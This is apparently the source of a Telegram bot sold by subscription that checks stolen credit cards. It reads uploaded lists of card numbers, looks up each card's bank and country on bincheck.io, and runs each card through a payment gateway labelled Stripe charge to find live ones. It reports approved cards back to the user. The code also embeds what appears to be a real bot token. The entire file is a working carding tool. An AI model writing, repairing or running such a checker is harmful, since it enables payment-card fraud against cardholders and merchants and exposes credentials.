import requests,re
import telebot
from telebot import types
from gatet import Tele
import os
token = "7055268669:AAEmU9YKSPaf1Csd1um89y0vry130O7UT6w"
bot=telebot.TeleBot(token,parse_mode="HTML")
@bot.message_handler(commands=["start"])
def start(message):
	mo=requests.get('https://t.me/ddadv4/32').text
	chat_id = message.chat.id
	if not str(chat_id) in mo:
		bot.reply_to(message, "You cannot use the bot to contact developers to purchase a bot subscription @PP4KP")
		return
	bot.reply_to(message,"Send the file now \n ارسل الملف الان")
@bot.message_handler(content_types=["document"])
def main(message):
	mo=requests.get('https://t.me/ddadv4/32').text
	chat_id = message.chat.id
	if not str(chat_id) in mo:
		bot.reply_to(message, "You cannot use the bot to contact developers to purchase a bot subscription @PP4KP")
		return
	dd = 0
	live = 0
	ko = (bot.reply_to(message, "Checking Your Cards...⌛").message_id)
	ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
	with open("combo.txt", "wb") as w:
		w.write(ee)
	try:
		with open("combo.txt", 'r') as file:
			lino = file.readlines()
			total = len(lino)
			for cc in lino:
				current_dir = os.getcwd()
				for filename in os.listdir(current_dir):
					if filename.endswith(".stop"):
						bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜ @PP4KP')
						os.remove('stop.stop')
						return
				try:
					headers = {
					'Referer': 'https://bincheck.io/',
					    'Upgrade-Insecure-Requests': '1',
					    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
					    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
					    'sec-ch-ua-mobile': '?1',
					    'sec-ch-ua-platform': 'Android',
					}
					response = requests.get('https://bincheck.io/details/' + cc[:6], headers=headers)
					html_text = response.text
					    
					card_brand_pattern = r'Card Brand</td>\n<td width="65%" class="p-2">\s*(\w+)'
					card_type_pattern = r'Card Type</td>\n<td width="65%" class="p-2">\s*(\w+)'
					card_level_pattern = r'Card Level</td>\n<td width="65%" class="p-2">\s*(\w+)'
					issuer_name_pattern = r'Issuer Name / Bank</td>\n<td width="65%" class="p-2">\s*<a[^>]*>([^<]+)'
					iso_country_name_pattern = r'ISO Country Name</td>\n<td width="65%" class="p-2">\s*<a[^>]*>([^<]+)'
					iso_country_code_pattern = r'ISO Country Code A2</td>\n<td width="65%" class="p-2">\s*(\w+)'
					card_brand_match = re.search(card_brand_pattern, html_text)
					card_brand = card_brand_match.group(1) if card_brand_match else "------"
					card_type_match = re.search(card_type_pattern, html_text)
					card_type = card_type_match.group(1) if card_type_match else "------"
					card_level_match = re.search(card_level_pattern, html_text)
					card_level = card_level_match.group(1) if card_level_match else "------"
					issuer_name_match = re.search(issuer_name_pattern, html_text)
					issuer_name = issuer_name_match.group(1) if issuer_name_match else "------"
					iso_country_name_match = re.search(iso_country_name_pattern, html_text)
					iso_country_name = iso_country_name_match.group(1) if iso_country_name_match else "------"
				except:
					pass

				try:
					last = str(Tele(cc))
				except Exception as e:
					print(e)
					last = "ERROR"
				mes = types.InlineKeyboardMarkup(row_width=1)
				cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
				status = types.InlineKeyboardButton(f" {last} ", callback_data='u8')
				cm3 = types.InlineKeyboardButton(f"• 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅ ➜ [ {live} ] •", callback_data='x')
				cm4 = types.InlineKeyboardButton(f"• 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌ ➜ [ {dd} ] •", callback_data='x')
				cm5 = types.InlineKeyboardButton(f"• 𝗧𝗢𝗧𝗔𝗟 👻 ➜ [ {total} ] •", callback_data='x')
				stop=types.InlineKeyboardButton(f"[ 𝐒𝐓𝐎𝐏 ]", callback_data='stop')
				mes.add(cm1,status, cm3, cm4, cm5, stop)
				bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''Wait for processing 
𝒃𝒚 ➜ @PP4KP ''', reply_markup=mes)
				msg = f" 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅\n\n 𝗖𝗮𝗿𝗱: <code>{cc}</code> 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe charge \n 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {last} \n\n 𝗜𝗻𝗳𝗼: {card_brand} - {card_type} - {card_level} \n 𝐈𝐬𝐬𝐮𝐞𝐫: {issuer_name} \n 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {iso_country_name} \n\n 𝐁𝐲: @PP4KP"
				print(last)
				if "live" in last or 'Funds' in last or "Gateway Rejected: avs" in last or "Card Issuer Declined CVV" in last or "funds" in last or "successfully" in last or "Nice! New payment method added:" in last or "Duplicate card exists in the vault." in last or "Approved" in last or "Invalid postal code or street address." in last or 'Transaction Not Allowed' in last:
					live += 1
					bot.reply_to(message, msg)
				else:
					dd += 1
	except Exception as e:
		print(e)
	bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜ @PP4KP')
@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
	with open("stop.stop", "w") as file:
		pass
print("تم تشغيل البوت")
bot.polling()
